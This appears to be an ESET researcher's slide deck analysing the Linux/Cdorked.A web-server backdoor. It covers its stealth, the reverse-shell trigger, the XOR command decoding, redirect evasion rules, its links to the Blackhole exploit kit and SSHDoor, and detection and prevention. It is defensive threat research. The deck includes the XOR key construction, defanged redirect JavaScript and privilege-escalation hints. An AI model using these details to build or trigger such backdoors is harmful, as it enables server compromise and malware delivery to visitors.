[{stepwise}]
* Linux \{desktop,server\} guy [detail]#10+ years#
* Been around [detail]#WebStorm Media, Bell Unix/Network, Inverse, ÉTS#
* Now works for ESET Canada [detail]#Malware Researcher#
* Achievements [detail]#Defcon, Hackfest, Nsec Hacker Jeopardy, montrehack#

[{topic}]
== What is this Cdorked thing anyway?

== \\

[quote]
____
Linux/Cdorked.A is a backdoor, used by malicious actor to serve malicious content from legitimate websites."
____

== \\

[quote]
____
This malware does not propagate by itself and it does not exploit a vulnerability in a specific software."
____


== \\
=== How did this started?

[{stepwise}]
* Sucuri contacted us [detail]#Web incidence response company#
* Observed malicious behavior [detail]#but couldn't reproduce it#

== \\
=== Tonight

* technical description [detail]#prevalence, stealthiness, how it works#
* bigger threat
* [some] attribution
* detection, prevention
* but first...

== \\
=== Why should you care?

[{stepwise}]
* Not infecting clients is best for reputation and returning users
* End-result infection almost always has some sort of credential stealer
* It is using your resources
* Your organization uses webservers
* Ops monitor the servers well? [detail]#this thing is stealthy#
* Ops don't run AV on Linux servers [detail]#IMHO nor should they#

[NOTES]
====
* this thing is stealthy
* biz also: not good if you infect your own organization
* They've got an httpd privileged shell!!
** but how did they installed it? A: root
====

== \\
=== High-level description
 
[{stepwise}]
* backdoor compiled in popular Web Servers 
** Apache, nginx, lighttpd
* redirect end-users HTTP requests [detail]#based on certain parameters#

[NOTES]
====
You have to be motivated to support all these webservers

====

== \\
=== Prevalence

[{stepwise}]
* Hundreds (thousands?) of compromised servers
* 50 ranked in Alexa's top 100 000
* Active since December 2012
* 100 000 ESET users exposed [detail]#but protected!#
* 3rd party info reveals several 100k's

[{topic}]
== Lets get `technical`

== \\
=== Stealth

[{stepwise}]
* only modified daemon binary on disk [detail]#no logs, no config#
* no hardcoded C&C servers [detail]#push instead of pull#
* configuration pushed by attacker through obfuscated HTTP requests
* uses POSIX shared memory for IPC
* strings are encrypted with a static XOR key image:xorkey.png[]

[NOTES]
====
* no logs is actually possible *because* it is not a module and can affect
  the logging chain
* harcoded C2: as opposed to most other threat we encounter. 
  possible because nature of webserver.
* obfusc HTTP: and these skip the webserver's usual logging mechanisms
====

== \\
=== Stealth++

Found in the wild doing:

[{stepwise}]
* Strict User-Agent blocking
* Strict Accept-Language blocking
* Long list of blacklisted IPs [detail]#~50% of IPv4#

[NOTES]
====
* Languages: no JP, finnish, russian, ukrainian, kazakh or belarusian
====

== \\
=== Shared memory

[{stepwise}]
* 6 MiB of POSIX shared memory [detail]#`shm`#
* Used for inter-process communications (IPC)
* First variant had world-writable permissions [detail]#doh..# 
  image:shm.png[]

== \\
=== Command channels

Two main command channels

* Reverse-connect backdoor
* HTTP Location redirect control

[{topic}]
== Backdoor

== \\

image::backdoor.jpg[height="100%"]

[NOTES]
====
* This is ESET researcher's view of a backdoor
====

== \\
=== Backdoor component

[{stepwise}]
* Some code "borrowed" from `cd00r` + 
  [detail]#a popular linux reverse-shell#
* Triggered via special `HTTP GET URI` and parameters
* Connect back is XOR obfuscated

[NOTES]
====
* hence the name
====

== \\
=== XOR obfuscation

[source,python]
----
h = headers
ip = (h['X-Real-IP'] || h['X-Forwarded-For'] || h['Remote-addr'])
ip = socket.inet_aton(ip)
xorkey = array.array('c', (
    (ord(ip[0]) + w) % 256,
    (ord(ip[1]) + x) % 256,
    (ord(ip[2]) + y) % 256,
    (ord(ip[3]) + z) % 256))
command = xor_decrypt(query_string, xorkey)
----

Since we can control `X-Real-IP` or + 
`X-Forwarded-For` a `0x00000000` key can be constructed

== \\
=== Backdoor quirks 

[{stepwise}]
* HTTP request hung until the shell is exited
* Upon termination, HTTP 302 redirects to google.com
* This is logged unlike other actions!

[{topic}]
== Malicious payload

HTTP Location redirect

== \\
=== Controlling it

|============================================================================

[NOTES]
====
*23 commands* available to affect redirection conditions

====

== \\
=== Staying under the radar

[{stepwise}]
* Won't redirect if URL, `Server-Name` or `Referrer` matches any of: + 
  'adm', 'webmaster', 'submit', 'stat', 'mrtg', 'webmin', 'cpanel', 'memb',
  'bucks', 'bill', 'host', 'secur', 'support'
* Additional restrictions on `Accept-Language`, `Accept-Encoding` and 
  `Referrer` headers

== \\
=== Not too aggressive

Only redirects victims once

* Relies on some hardcoded cookie
+
[source,perl]
----
$cookie =~ /GIDID=6745609876567/;
----
+
* and, we're pretty sure, also with server-side state

== \\
=== Lastly

* Custom redirections supported [detail]#`User-Agent` based#

== \\
=== Redirection control mechanism

The query must have:

[{stepwise}]
* `POST` to a special URL pattern (not unique)
* Client IP is similarily XORed as with the backdoor mechanism
* `SECID=...` cookie to pass arguments to the malware
* Some status returned through ETag header

[NOTES]
====
* Varies per sample
* With hex-encoded command in the query portion
====

[{topic}]
== Beyond Cdorked

Let's see how the campaign we are tracking right now behaves.
[detail]#You have an idea for a cool name?#

But first...

[NOTES]
====
* Cdorked is the framework, we will look at this campaign's implementation

image::blackhole.jpg[width="100%"]

[NOTES]
====
* but first you need to understand blackhole
====

== \\
=== Blackhole background

[{stepwise}]
* Operator 'licenses' a copy of Blackhole
* Victim loads compromised Web page who sends it to Blackhole server
* Server push obfuscated javascript to identify usable vulnerability
* Server sends exploit [detail]#Browser, Java applet, Adobe Reader or Flash, etc.#
* Operator decides what malicious code he 'deploys' on client computer

[NOTES]
====
* We believe the real server is usually hidden behind reverse-proxy on
  compromised site
====

== \\
=== Redirection chain

----

* OWASP people, what is this?

== \\
=== Yes, Base64!

* `j=` is base64 encoded:
----
js=1&nvcbimuf=ccvckqju&time=1304161827-360453650&src=232&surl=www.infectedserver.com&sport=80&key=13D90950&suri=/forum/wcf/js/3rdParty/protoaculous.1.8.2.min.js
----
* `surl`, `sport`, `suri`, `js`, ...
* Data to client delivered based on URL (javascript, html)

== \\
=== Example first javascript redirection

[source,javascript]
----
var iflag = "0"; if (top!=self) { iflag = "1"; };
var b64str = "MTQxNDExMzA1MDIyMjQ4M...luLmNvbS9zb3J0LnBocA==";
setTimeout ( function() { 
    location.replace( "hxxp://ae334b05c4249f38" + iflag + b64dec(b64str) );
}, 280);
----
* `iflag`: prevent/detect a straight query?
* `b64` provided by server. debase64'd gives something like:

[NOTES]
====
Why extended DNS? Not sure but:
* keep client side state (timestamp)
* operator think it's stealthy?
====

== \\
=== Example iframe injection

[source, javascript]
----
function gotime() { xflag=false; top.location.replace(b64dec("aHR0cDovL2FlMzM0YjA1YzQyNDlmM...
...cD94PTEzNyZ0PXRpbWVvdXQ=")); };

=== While researching this

* Evidence of link to SSHDoor [detail]#aka Ebury#
* IPs cross-referenced between the two

|=====================================================
| CDorked XOR             | SSHDoor XOR
| image:cdorked-xor.png[] | image:sshdoor-xor.png[]
|=====================================================


== \\
=== Quite complex server-side operation

[{stepwise}]
* Compromised web-servers
* Compromised SSH servers [detail]#stealing credentials, private keys, ...#
* Compromised DNS servers

== \\
=== Tracking

* Seen a single server redirect 28 000 users to malware in 24h
* Around 10 nameservers tracked
* Cleaned hosts get reinfected [detail]#:(#

== \\
=== Tracking changes

* Domain name changes quickly
* Nameservers changes less quickly
* Blackhole host (reverse-proxies?) changes even less often
* Query path also changes + 
  [detail]#`/info/last/index.php` is now `/sec/i/index.php`#

== \\
=== Some numbers

image:info-last-hits.png[width="95%"]

== \\
=== Ongoing investigation

* We have a compromised DNS server sample
* SSH backdoors more prevalent than we initially thought [detail]#several versions#

Expect blog posts with more information soon!

== \\
=== How did we get there?

[{stepwise}]
* Got sample
* Mad reversing skillz
* Bulk imported the Apache headers in IDA
* Confirmed hypothesis in virtual environment
* Using our data sources for further analysis

[NOTES]
====
* Please please send us your samples! We analyze them for free (if they are interesting)
* added functions were actually pretty easy to spot (hash-looking names)
====

[{topic}]
== What can you do?

== \\
=== Detect it

* We have made an open source small
  http://www.welivesecurity.com/wp-content/uploads/2013/04/dump_cdorked_config.c[detection program]
* Backdoor usage could be detected via netstat

[NOTES]
====
* latest Cdorked version not detected by it... shm perm and size changes.
  working on it
* due to long lived outgoing TCP connection from Apache process
====

[{topic}]
== Prevent it

== \\
=== Verify your OS' integrity

* http://manpages.ubuntu.com/manpages/natty/man1/debsums.1.html[debsums]
* http://linux.die.net/man/8/rpm[rpm --verify]
* External integrity verification [detail]#tripwire, memory forensics#

But remember that the integrity database can be tampered with!

[NOTES]
====
* lesser known could be better
* arguably you want to verify maybe from remote location
====

== \\
=== Build farms of Linux malware?

I don't think so!

So don't install `gcc` on production systems!

[NOTES]
====
* but actually maybe they do spread with RPMs since they are root?
* lets discuss this over beer :)
====

== \\
=== Other ideas

* Reduce attack surface with read-only filesystem for your webroot/
* Disable the `shell` of your webserver user

[NOTES]

But why are these servers getting popped in the first place?"

== \\
=== We don't know...

Hypothesis

[{stepwise}]
* leaked credentials
* compromised *panel software
* webapp vulnerabilities

[NOTES]
====
* our industry isn't as equipped to do server forensics
* discuss the leaks
====

== \\
=== Escalation to root

Symlink attacks combined with

[{stepwise}]
* cron jobs
* custom `php.ini`
* procmail, cgi-bin/

[NOTES]
====
* from FTP or httpd account
* sucuri's info
